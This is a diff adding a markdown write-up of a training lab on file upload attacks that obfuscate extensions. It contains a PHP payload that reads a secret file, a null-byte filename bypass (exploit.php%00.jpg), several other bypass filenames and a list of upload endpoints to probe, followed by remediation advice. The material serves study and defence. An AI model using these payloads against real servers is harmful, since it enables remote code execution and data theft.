@@ -959,3 +959,258 @@ Upload → RCE → Cloud credentials → full cloud compromise
 
 ### Execution is controlled by server configuration
 > If .php is blocked → create your own extension
+
+---
+
+# 🧠Lab-5 File Upload Vulnerability — Obfuscating File Extensions (Null Byte & Double Extension)
+
+---
+
+## 1️⃣ Overview
+
+Obfuscating file extensions is an attack technique where a dangerous executable file
+(e.g. .php) is disguised so that:
+
+- The application’s validation logic thinks the file is safe
+- The web server or filesystem later treats it as executable
+
+This results in *Remote Code Execution (RCE)* through file upload.
+
+---
+
+## 2️⃣ What This Topic Is Really About
+
+This topic is *not PHP-specific*.
+
+It exists because of *parsing inconsistencies* between:
+
+- Application-level validation logic
+- Web server execution logic
+- Filesystem handling
+- Encoding and decoding layers
+
+> When two components interpret the same filename differently, the attacker wins.
+
+---
+
+## 3️⃣ Core Mental Model
+
+Two entities interpret the filename:
+
+### 👮 Validator (Application Logic)
+
+- Written in PHP / Java / JavaScript
+- Uses regex or string matching
+- Often checks only the last extension
+
+### 👨‍🔧 Executor (Server / OS)
+
+- Apache / Nginx / IIS
+- MIME mappings and execution rules
+- Lower-level filename handling
+
+*Attack succeeds when:*
+
+> Validator says “safe”  
+> Executor says “executable”
+
+---
+
+## 4️⃣ Lab Walkthrough (Step-by-Step)
+
+### Step 1 — Login
+
+- Username: wiener
+- Password: peter
+
+---
+
+### Step 2 — Recon Upload Path
+
+- Upload a normal image
+- Observe avatar is loaded from:
+
+GET /files/avatars/<image>
+
+This confirms:
+
+- Files are publicly accessible
+- Upload directory is inside web root
+
+---
+
+### Step 3 — Prepare PHP Payload
+
+Create the following file:
+```
+<?php
+echo file_get_contents('/home/carlos/secret');
+?>
+```
+
+---
+
+### Step 4 — Initial Upload Attempt
+
+Upload file as:
+
+exploit.php
+
+Result:
+
+- ❌ Upload blocked
+- Extension blacklist in place
+
+---
+
+### Step 5 — Obfuscation via Null Byte & Double Extension
+
+Intercept the upload request in Burp and modify filename to:
+
+exploit.php%00.jpg
+
+Why this works:
+
+- Application sees .jpg
+- Filesystem truncates at %00
+- File is saved as exploit.php
+
+Upload result:
+
+- ✔ Upload accepted
+
+---
+
+### Step 6 — Trigger Execution
+
+Request the uploaded file:
+
+GET /files/avatars/exploit.php
+
+Result:
+
+- ✔ PHP executed
+- ✔ Carlos’s secret revealed
+
+---
+
+### Step 7 — Lab Solved
+
+- Submit the secret
+- Lab marked as solved
+
+---
+
+## Evidence
+
+### Screenshot 1 — PHP Shell Upload via Null Byte & Double Extension
+
+![](../images/upload-null-byte-double-extension.png)
+
+---
+
+### Screenshot 2 — Carlos Secret Retrieved via exploit.php Execution
+
+![](../images/carlos-secret-exploit-php.png)
+
+---
+
+## 6️⃣ Real-World Scenarios
+
+### Case Sensitivity Confusion
+
+shell.pHp
+
+- Validator: misses .php
+- Server: executes as PHP
+
+---
+
+### Multiple Extensions
+
+shell.php.jpg
+
+- Validator checks last extension
+- Server executes first executable extension
+
+---
+
+### Trailing Dot / Space
+
+shell.php. shell.php␠
+
+- Validator: not .php
+- Filesystem trims → .php
+
+---
+
+### URL Encoding Mismatch
+
+shell%2Ephp
+
+- Validator checks raw
+- Server decodes → .php
+
+---
+
+### Double URL Encoding
+
+shell%252Ephp
+
+- Validator decodes once
+- Server decodes twice
+
+---
+
+## 7️⃣ High-Value Endpoints to Test
+```
+- /upload
+- /avatar
+- /profile/photo
+- /media
+- /files
+- /assets
+- /api/upload
+- /import
+- /backup/restore
+```
+---
+
+## 8️⃣ Impact
+
+- Remote Code Execution
+- Full application compromise
+- Database access
+- Credential theft
+
+*Severity: CRITICAL*
+
+---
+
+## 9️⃣ Why Blacklists Always Fail
+
+- Infinite encodings
+- Infinite extensions
+- Infinite parsing paths
+
+> You cannot blacklist creativity.
+
+---
+
+## 🔟 Proper Remediation
+
+- Use strict allowlists
+- Validate magic bytes
+- Rename files server-side
+- Store uploads outside web root
+- Disable execution in upload directories
+- Normalize input before validation
+
+---
+
+## ✅ Final Takeaway
+
+> If file parsing is inconsistent, upload restrictions are meaningless.
+
+
+---
